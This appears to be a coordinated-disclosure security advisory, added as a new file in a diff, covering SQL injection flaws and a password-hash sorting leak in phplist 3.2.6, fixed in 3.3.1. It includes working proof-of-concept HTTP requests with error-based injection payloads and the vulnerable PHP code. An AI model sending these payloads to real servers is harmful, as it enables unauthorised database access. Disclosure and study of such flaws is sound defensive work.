@@ -1,0 +1,185 @@
+1. Introduction
+
+Affected Product:	phplist 3.2.6
+Fixed in:	3.3.1
+Fixed Version Link:	https://sourceforge.net/projects/phplist/files/phplist/3.3.1/phplist-3.3.1.zip/download
+Vendor Website:	https://www.phplist.org/
+Vulnerability Type:	SQL Injection
+Remote Exploitable:	Yes
+Reported to vendor:	01/10/2017
+Disclosed to public:	02/20/2017
+Release mode:	Coordinated Release
+CVE:	n/a (not requested)
+Credits	Tim Coen of Curesec GmbH
+
+2. Overview
+
+phplist is an application to manage newsletters, written in PHP. In version 3.2.6, it is vulnerable to SQL injection.
+
+The application contains two SQL injections, one of which is in the administration area and one which requires no credentials. Additionally, at least one query is not properly protected against injections. Furthermore, a query in the administration area discloses some information on the password hashes of users.
+
+
+3. Details
+
+SQL Injection 1: Edit Subscription
+
+CVSS: High 7.1 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+
+It is possible for an unauthenticated user to perform an SQL injection when updating the subscription information of an already subscribed user.
+
+The protection against SQL injection relies on a combination of a custom magic quotes function which applies addslashes to all input values and a function which applies htmlspecialchars to all inputs. Additionally, some input values are cast to integers to prevent injections. addslashes protects against injections into arguments which are placed into single quotes, while htmlspecialchars protects against injections into double quotes.
+
+It should be noted that neither addslashes nor htmlspecialchars are recommended to prevent SQL Injection.
+
+The update functionality is vulnerable to SQL Injection as it uses the key of POST data, while only values of POST data are escaped via addslashes, but not keys.
+
+Proof of Concept:
+
+POST /lists/index.php?p=subscribe&uid=f8082b7cc4da7f94ba42d88ebfb5b1e2&email=foo%40example.com
+HTTP/1.1
+Host: localhost
+Connection: close
+Content-Length: 209
+       
+email=foo%40example.com&emailconfirm=foo%40example.com&textemail=1&list%5B2 or extractvalue(1,version()) %5D=signup&listname%5B2%5D=newsletter&VerificationCodeX=&update=Subscribe+to+the+selected+newsletters%27
+
+The proof of concept is chosen for simplicity and will only work if error messages are displayed to the user. If this is not the case, other techniques can be used to extract data from the database.
+
+Code:
+
+/lists/admin/subscribelib2.php
+$lists = '';
+if (is_array($_POST['list'])) {
+	while (list($key, $val) = each($_POST['list'])) {
+    	if ($val == 'signup') {
+        	$result = Sql_query("replace into
+			{$GLOBALS['tables']['listuser']} (userid,listid,entered)
+			values($userid,$key,now())");
+			# $lists .= "  * ".$_POST["listname"][$key]."\n";
+		}
+	}
+}
+
+
+SQL Injection 2: Sending Campaign (Admin)
+
+CVSS: Medium 4.7 CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L
+
+When sending a campaign, the sendformat parameter is vulnerable to SQL injection. The injection takes place into an UPDATE, so the easiest way to extract data is via error based SQL injection.
+
+An account with the right to send campaigns is required to exploit this issue.
+
+Proof of Concept:
+
+POST /lists/admin/?page=send&id=2&tk=c&tab=Format HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=k6m0jgl4niq7643hohik5jgm12
+Connection: close
+Content-Length: 323
+       
+formtoken=27211e65922b95d986bfaf706ccd2ca0&workaround_fck_bug=1&followupto=http%3A%2F%2Flocalhost%2Flists%2Fadmin%2F%3Fpage%3Dsend%26id%3D2%26tk%3Dc%26tab%3DScheduling&htmlformatted=auto&sendformat=HTML"
+or extractvalue(1,version()) -- -
+&id=2&status=draft&id=2&status=draft&campaigntitle=campaign+meta%27%22%3E&testtarget=
+
+Code:
+
+// /lists/admin/send_core.php:198
+$result = Sql_Query(
+	sprintf('update %s  set
+		subject = "%s", fromfield = "%s", tofield = "%s",
+		replyto ="%s", embargo = "%s", repeatinterval = "%s",
+		repeatuntil = "%s",
+		message = "%s", textmessage = "%s", footer = "%s", status = "%s",
+		htmlformatted = "%s", sendformat  = "%s", template  =  "%s"
+		where id = %d',
+		$tables['message'],
+		sql_escape(strip_tags($messagedata['campaigntitle'])),
+		/* we store the title in the subject field. Better would
+		be to rename the DB column, but this will do for now */
+		sql_escape($messagedata['fromfield']),
+		sql_escape($messagedata['tofield']),
+		sql_escape($messagedata['replyto']),
+		sprintf('d-d-d d:d',
+			$messagedata['embargo']['year'],
+			$messagedata['embargo']['month'], $messagedata['embargo']['day'],
+			$messagedata['embargo']['hour'],
+			$messagedata['embargo']['minute']), 
+		$messagedata['repeatinterval'],
+		sprintf('d-d-d d:d',
+			$messagedata['repeatuntil']['year'],
+			$messagedata['repeatuntil']['month'],
+			$messagedata['repeatuntil']['day'],
+			$messagedata['repeatuntil']['hour'],
+			$messagedata['repeatuntil']['minute']),
+		sql_escape($messagedata['message']),
+		sql_escape($messagedata['textmessage']),
+		sql_escape($messagedata['footer']),
+		sql_escape($messagedata['status']), $htmlformatted ? '1'
+		: '0', $messagedata['sendformat'],
+		sql_escape($messagedata['template']), $id
+	)
+);
+
+Sort By: Password (Admin)
+
+CVSS: Low 2.2 CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N
+
+When viewing users, the sortby parameter can be used to sort the list. The drop down list allows sorting by email, dates, and so on. All non-word characters are removed, but there are no further checks.
+
+It is possible to gather some information on the password of users via this parameter, as it is possible to set it to sort by password.
+
+By repeatedly changing the password of an existing user, the characters of a password hash could be bruteforced by looking at the position of the user the attacker controls.
+
+An account with the right to view users is required to exploit this issue.
+
+Proof of Concept:
+
+http://localhost//lists/admin/?page=users&start=0&find=&findby=&sortby=password&sortorder=desc&change=Go&id=0&find=&findby=email
+
+
+Insufficient Protection against SQL Injection
+
+CVSS: n/a
+
+When subscribing a user, metadata is saved in the database. When saving this data in the database, it is neither properly escaped nor are prepared statements used, but the input is HTML encoded.
+
+Because of this, an unauthenticated user has control over part of the query.
+
+This issue is not currently exploitable, but may be exploitable if changes are made to the query. The approach of HTML encoding instead of using prepared statements to defend against SQL injection is also more error prone and may result in further queries which are vulnerable.
+
+A user can create a database error with the following request:
+
+POST /lists/index.php?p=subscribe&id=a\ HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=8h5fh18cqe41a2l1t6224tf9v4
+Connection: close
+           
+formtoken=5bf7774ff0f2e396081dc1478cd92201&makeconfirmed=0&email=foo%40example.com&emailconfirm=foo%40example.com&textemail=1&list%5B2%5D=signup&listname%5B2%5D=newsletter&VerificationCodeX=&subscribe=Subscribe+to+the+selected+newsletters%27
+
+
+The resulting query is:
+
+insert into phplist_user_user_history (ip,userid,date,summary,detail,systeminfo)
+values("127.0.0.1",2,now(),"Re-Subscription","[...]","
+    HTTP_USER_AGENT = [...]
+    REQUEST_URI = /lists/index.php?p=subscribe&id=a\")
+
+It can be seen that the slash in the request escapes the quote of the query which causes an error.
+
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 3.3.1:
+
+https://sourceforge.net/projects/phplist/files/phplist/3.3.1/phplist-3.3.1.zip/download
+
+Please note that a newer version might already be available.
+
+
+5. Report Timeline
+
+01/10/2017	Informed Vendor about Issue
+01/16/2017	Vendor confirms
+02/15/2017	Asked Vendor to confirm that new release fixes issues
+02/15/2017	Vendor confirms
+02/20/2017	Disclosed to public
